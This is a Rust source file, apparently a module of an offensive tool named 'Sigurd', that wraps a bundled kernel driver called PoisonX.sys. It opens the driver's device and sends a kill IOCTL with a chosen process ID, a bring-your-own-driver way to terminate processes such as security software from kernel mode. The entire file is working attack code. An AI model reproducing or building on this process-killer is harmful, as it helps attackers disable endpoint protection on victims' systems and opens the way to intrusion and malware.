use std::ptr::null_mut;
use include_packed::include_packed;

use winapi::{
    ctypes::c_void, 
    um::{
        fileapi::{CreateFileW, OPEN_EXISTING}, handleapi::{CloseHandle, INVALID_HANDLE_VALUE}, ioapiset::DeviceIoControl, winnt::{GENERIC_READ, GENERIC_WRITE}
    }
};

use crate::{
    trace, 
    drivers::KillerDriver, 
    utils::{error::SigurdError, to_wstring}
};

const DRIVER_NAME: &str = "PoisonX";
const VERSION: &str = "0.0.1";

const DRIVER_DEVICE: &str = "\\\\.\\{F8284233-48F4-4680-ADDD-F8284233}";
const IOCTL_KILL: u32 = 0x22E010;

pub struct PoisonX {
    device: *mut c_void
}

impl PoisonX {}

impl KillerDriver for PoisonX {
    fn new() -> Result<Box<dyn KillerDriver>, SigurdError> where Self: Sized + 'static {
        return Ok(Box::new(Self { device: 0 as *mut c_void }));
    }

    fn init(&mut self) -> Result<bool, SigurdError> {
        unsafe {
            let handle = CreateFileW(
                to_wstring(DRIVER_DEVICE).as_ptr(), 
                GENERIC_READ | GENERIC_WRITE, 
                0,
                null_mut(), 
                OPEN_EXISTING, 
                0, 
                null_mut(),
            );

            if handle == INVALID_HANDLE_VALUE { 
                return Err(SigurdError::last("Can't get dervice handle"));
            } else {
                trace!("Got device handle");
                self.device = handle;
                return Ok(true);
            }
        }
    }

    fn destruct(&mut self) -> Result<bool, SigurdError> {
        unsafe {
            match CloseHandle(self.device) {
                0 => {
                    return Err(SigurdError::last("Can't close device handle"));
                }
                _ => {
                    trace!("Closed device handle");
                    return Ok(true);
                }
            }
        }
    }

    fn name(&self) -> &'static str {
        return DRIVER_NAME;
    }

    fn version(&self) -> &'static str {
        return VERSION;
    }

    fn description(&self) -> &'static str {
        return "A PoisonX driver";
    }

    fn get_file(&self) -> Result<Vec<u8>, crate::utils::error::SigurdError> {
        let v = include_packed!("drivers/PoisonX.sys");
        return Ok(v);
    }

    fn kill(&mut self, pid: u32) -> Result<(), crate::utils::error::SigurdError> {
        unsafe {
            let mut out = [0u8; 16];
            let mut bytes = 0u32;
            let mut pid_str = [0u8; 16];
            let pid_dec = pid.to_string();
            pid_str[..pid_dec.len()].copy_from_slice(pid_dec.as_bytes());
            let success = DeviceIoControl(
                self.device,
                IOCTL_KILL,
                pid_str.as_mut_ptr() as *mut _,
                (pid_dec.len() + 1) as u32,
                out.as_mut_ptr() as *mut _,
                out.len() as u32,
                &mut bytes,
                null_mut(),
            );
            
            if success != 0 {
                trace!("IOCTRL request send {}", IOCTL_KILL);
                return Ok(());
            } else {
                return Err(SigurdError::last("Failed to kill the process"));
            }
        }
    }
}
